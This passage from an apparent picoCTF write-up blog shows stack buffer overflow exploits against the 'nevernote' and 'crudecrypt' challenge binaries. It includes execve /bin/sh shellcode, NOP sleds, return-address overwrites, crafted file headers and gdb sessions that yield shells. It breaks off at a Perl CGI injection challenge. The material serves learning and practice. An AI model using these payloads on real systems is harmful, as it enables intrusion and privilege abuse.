</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x44444444</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>w00t! We have control over EIP! Since ASLR is off and so is NX, we can just jump a piece of shellcode. Let’s stick in the shellcode (23 bytes execve /bin/sh) and alter the canary to 4*0x90 (which is the start of the NOP sled). Let&rsquo;s overwrite EIP with <code>0x804c070</code> to jump in the middle of our NOP sled. We cat the payload &amp; use another cat to keep shell alive:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">512</span><span class="o">-</span><span class="mi">23</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x90\x90\x90\x90</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08CC</span><span class="s">CCCCCCCCCCCCCC</span><span class="se">\x70\xc0\x04\x08\x50\xc0\x04\x08FF</span><span class="s">FF&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'>
</span><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span><span class="p">;</span> <span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="p">.</span><span class="o">/</span><span class="n">nevernote</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span>
</span><span class='line'><span class="n">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">11066</span><span class="p">(</span><span class="n">pico1139</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span> <span class="n">egid</span><span class="o">=</span><span class="mi">1011</span><span class="p">(</span><span class="n">nevernote</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span>
</span><span class='line'><span class="n">whoami</span>
</span><span class='line'><span class="n">pico1139</span>
</span><span class='line'><span class="n">cat</span> <span class="n">flag</span><span class="o">*</span>
</span><span class='line'><span class="n">the_hairy_canary_fairy_is_still_very_wary</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>the_hairy_canary_fairy_is_still_very_wary</code>.</p>

<h1>Crudecrypt (180 points)</h1>

<p>We are given access to a program that can encrypt and decrypt a file. The program does not try to sanitize user input when decrypting:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">decrypt_file</span><span class="p">(</span><span class="kt">FILE</span><span class="o">*</span> <span class="n">enc_file</span><span class="p">,</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">raw_file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">file_size</span><span class="p">(</span><span class="n">enc_file</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">enc_buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fread</span><span class="p">(</span><span class="n">enc_buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">enc_file</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">decrypt_buffer</span><span class="p">(</span><span class="n">enc_buf</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;There was an error decrypting the file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">raw_buf</span> <span class="o">=</span> <span class="n">enc_buf</span><span class="p">;</span>
</span><span class='line'>    <span class="n">file_header</span><span class="o">*</span> <span class="n">header</span> <span class="o">=</span> <span class="p">(</span><span class="n">file_header</span><span class="o">*</span><span class="p">)</span> <span class="n">raw_buf</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">header</span><span class="o">-&gt;</span><span class="n">magic_number</span> <span class="o">!=</span> <span class="n">MAGIC</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid password!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">check_hostname</span><span class="p">(</span><span class="n">header</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[#] Warning: File not encrypted by current machine.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// snip</span>
</span><span class='line'>
</span><span class='line'><span class="kt">bool</span> <span class="n">check_hostname</span><span class="p">(</span><span class="n">file_header</span><span class="o">*</span> <span class="n">header</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">saved_host</span><span class="p">[</span><span class="n">HOST_LEN</span><span class="p">],</span> <span class="n">current_host</span><span class="p">[</span><span class="n">HOST_LEN</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// unsafe strncpy if we supply a large string for header-&gt;host</span>
</span><span class='line'>    <span class="n">strncpy</span><span class="p">(</span><span class="n">saved_host</span><span class="p">,</span> <span class="n">header</span><span class="o">-&gt;</span><span class="n">host</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">header</span><span class="o">-&gt;</span><span class="n">host</span><span class="p">));</span>
</span><span class='line'>    <span class="n">safe_gethostname</span><span class="p">(</span><span class="n">current_host</span><span class="p">,</span> <span class="n">HOST_LEN</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">saved_host</span><span class="p">,</span> <span class="n">current_host</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If the attacker can supply an encrypted file header with a large host field, then we can overflow the saved_host array on the stack &amp; overwrite EIP. We modified the source of crudecrypt.c to generate such a file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">encrypt_file</span><span class="p">(</span><span class="kt">FILE</span><span class="o">*</span> <span class="n">raw_file</span><span class="p">,</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">enc_file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">file_size</span><span class="p">(</span><span class="n">raw_file</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">size_t</span> <span class="n">block_size</span> <span class="o">=</span> <span class="n">MULT_BLOCK_SIZE</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">file_header</span><span class="p">)</span> <span class="o">+</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">padded_block</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">block_size</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">file_header</span> <span class="n">header</span><span class="p">;</span>
</span><span class='line'>    <span class="n">init_file_header</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">//safe_gethostname(header.host, HOST_LEN);</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">header</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>We encrypted the payload using this modified crudecrypt.c. Then we decrypted it, observing the crash!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#0  0x45454545 in ?? ()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0xffffff00</span>  <span class="o">-</span><span class="mi">256</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0x73</span>    <span class="mi">115</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0xffffd660</span>  <span class="o">-</span><span class="mi">10656</span>   <span class="o">&gt;</span> <span class="n">perfect</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">start</span> <span class="n">of</span> <span class="n">buffer</span>
</span><span class='line'><span class="n">ebx</span>            <span class="mh">0xf7dea000</span>  <span class="o">-</span><span class="mi">136404992</span>
</span><span class='line'><span class="n">esp</span>            <span class="mh">0xffffd690</span>  <span class="mh">0xffffd690</span>
</span><span class='line'><span class="n">ebp</span>            <span class="mh">0x44444444</span>  <span class="mh">0x44444444</span>
</span><span class='line'><span class="n">esi</span>            <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">edi</span>            <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">eip</span>            <span class="mh">0x45454545</span>  <span class="mh">0x45454545</span>
</span><span class='line'><span class="n">eflags</span>         <span class="mh">0x10286</span> <span class="p">[</span> <span class="n">PF</span> <span class="n">SF</span> <span class="n">IF</span> <span class="n">RF</span> <span class="p">]</span>
</span><span class='line'><span class="n">cs</span>             <span class="mh">0x23</span>    <span class="mi">35</span>
</span><span class='line'><span class="n">ss</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">ds</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">es</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">fs</span>             <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">gs</span>             <span class="mh">0x63</span>    <span class="mi">99</span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like ALSR is off! There was no <code>jmp edx</code> in the binary that I could find, so instead, let&rsquo;s just jump to the buffer:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">encrypt_file</span><span class="p">(</span><span class="kt">FILE</span><span class="o">*</span> <span class="n">raw_file</span><span class="p">,</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">enc_file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">file_size</span><span class="p">(</span><span class="n">raw_file</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">size_t</span> <span class="n">block_size</span> <span class="o">=</span> <span class="n">MULT_BLOCK_SIZE</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">file_header</span><span class="p">)</span> <span class="o">+</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">padded_block</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">block_size</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">file_header</span> <span class="n">header</span><span class="p">;</span>
</span><span class='line'>    <span class="n">init_file_header</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">//safe_gethostname(header.host, HOST_LEN);</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80</span><span class="s">&quot;&quot;BBCCCCDDDD</span><span class="se">\x30\xd6\xff\xff</span><span class="s">&quot;&quot;FFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">header</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>compile &amp; run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">picoctf</span><span class="o">/</span><span class="n">crudecrypt</span><span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">exploit</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">lcrypto</span> <span class="o">-</span><span class="n">lmcrypt</span> <span class="o">-</span><span class="n">lssl</span> <span class="o">-</span><span class="n">m32</span>
</span><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">picoctf</span><span class="o">/</span><span class="n">crudecrypt</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span> <span class="n">encrypt</span> <span class="p">.</span><span class="o">/</span><span class="n">a</span> <span class="p">.</span><span class="o">/</span><span class="n">b</span>
</span><span class='line'><span class="o">-=-</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">CrudeCrypt</span> <span class="mf">0.1</span> <span class="n">Beta</span> <span class="o">-=-</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="n">File</span> <span class="nl">password</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="o">=&gt;</span> <span class="n">Encrypted</span> <span class="n">file</span> <span class="n">successfully</span>
</span><span class='line'><span class="o">***</span> <span class="n">Error</span> <span class="n">in</span> <span class="err">`</span><span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="err">&#39;</span><span class="o">:</span> <span class="n">free</span><span class="p">()</span><span class="o">:</span> <span class="n">invalid</span> <span class="nl">pointer</span><span class="p">:</span> <span class="mh">0x0920f300</span> <span class="o">***</span>
</span><span class='line'><span class="n">Aborted</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
</span><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">picoctf</span><span class="o">/</span><span class="n">crudecrypt</span><span class="err">$</span> <span class="n">cat</span> <span class="n">b</span> <span class="o">|</span><span class="n">base64</span>
</span><span class='line'><span class="n">qmikXTf65Xauen</span><span class="o">/</span><span class="n">t3a0FDf1uZMI3baSe5I9hTVEJ5t04R0Vb8RgBltvIwvCvmbaOtou7THTwR5Vy</span>
</span><span class='line'><span class="n">B9dA2GyFxMLF</span><span class="o">/</span><span class="n">wyNDY9V</span><span class="o">/</span><span class="n">y2bveRKWLam5xehXkNXQFSMhUJcd3RNwfgFxVlYswx4VfW1CiqmV45S</span>
</span><span class='line'><span class="n">ZzbvWLRmeRdk1vyxXQSq0nyDhcPi8GhwnKp6R1ri</span>
</span></code></pre></td></tr></table></div></figure>


<p>We transferred the base64 encoded payload to remote machine. We had to adjust the pointer to the shellcode because the address changes on stack due to environment changing. We found this new pointer by simply running gdb.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="p">.</span><span class="c1">///////////////crude_crypt decrypt ./sp ./bleh</span>
</span><span class='line'><span class="o">-=-</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">CrudeCrypt</span> <span class="mf">0.1</span> <span class="n">Beta</span> <span class="o">-=-</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="n">File</span> <span class="nl">password</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="cp">#0  0xffffd674 in ?? ()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0xffffff00</span>  <span class="o">-</span><span class="mi">256</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0xb4</span>    <span class="mi">180</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0xffffd5f2</span>  <span class="o">-</span><span class="mi">10766</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0xffffd5f2</span>
</span><span class='line'><span class="mh">0xffffd5f2</span><span class="o">:</span>    <span class="s">&quot;Ph//shh/bin</span><span class="se">\211\343\215</span><span class="s">T$</span><span class="se">\b</span><span class="s">...BBCCCCDDDD&quot;</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">i</span> <span class="mh">0xffffd5f0</span>
</span><span class='line'>   <span class="mh">0xffffd5f0</span><span class="o">:</span> <span class="n">xor</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0xffffd5f2</span><span class="o">:</span> <span class="n">push</span>   <span class="o">%</span><span class="n">eax</span>
</span></code></pre></td></tr></table></div></figure>


<p>After adjusting the address to <code>0xffffd5f0</code> in the exploit, we end up with a shell! A NOP sled would&rsquo;ve been easy, in this case.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">b</span> <span class="o">|</span><span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="o">&gt;</span> <span class="p">.</span><span class="o">/</span><span class="n">sp</span>
</span><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">crudecrypt</span><span class="o">/</span><span class="n">crude_crypt</span> <span class="n">decrypt</span> <span class="p">.</span><span class="o">/</span><span class="n">sp</span> <span class="p">.</span><span class="o">/</span><span class="n">bleh</span>
</span><span class='line'><span class="o">-=-</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">CrudeCrypt</span> <span class="mf">0.1</span> <span class="n">Beta</span> <span class="o">-=-</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="n">File</span> <span class="nl">password</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="err">$</span> <span class="n">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">11066</span><span class="p">(</span><span class="n">pico1139</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span> <span class="n">egid</span><span class="o">=</span><span class="mi">1012</span><span class="p">(</span><span class="n">crudecrypt</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span>
</span><span class='line'><span class="err">$</span> <span class="n">whoami</span>
</span><span class='line'><span class="n">pico1139</span>
</span><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">crudecrypt</span><span class="o">/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">writing_software_is_hard</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>writing_software_is_hard</code>.</p>

<h1>Make a Face (100 points)</h1>

<p>We need to exploit a perl script running on a Webpage. This script takes user input and generates an &ldquo;avatar&rdquo;. We immediately figured Shellshock but this turned out to be wrong. The script is included in the webpage source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$q</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CGI</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Head&#39;</span><span class="p">)))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">print</span> <span class="nv">$q</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">(</span><span class="o">-</span><span class="n">type</span><span class="o">=&gt;</span><span class="s">&#39;image/bmp&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">HEAD</span><span class="p">,</span><span class="s">&quot;head&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Head&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">HAIR</span><span class="p">,</span><span class="s">&quot;hair&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Hair&#39;</span><span class="p">));</span>
